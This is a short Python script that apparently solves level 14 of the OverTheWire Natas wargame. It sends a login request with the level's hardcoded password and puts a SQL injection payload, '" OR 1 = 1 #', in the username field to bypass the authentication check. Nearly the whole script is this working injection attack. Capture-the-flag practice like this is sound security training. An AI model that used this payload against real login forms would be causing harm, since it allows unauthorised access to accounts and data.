#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re #(regular expressions)

username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests.Session()

#response = session.get(url, auth=(username, password))
response = session.post(url, data = {"username" : 'shenal" OR 1 = 1	#', "password" : "mario"}, auth=(username, password))

content = response.text
print(content)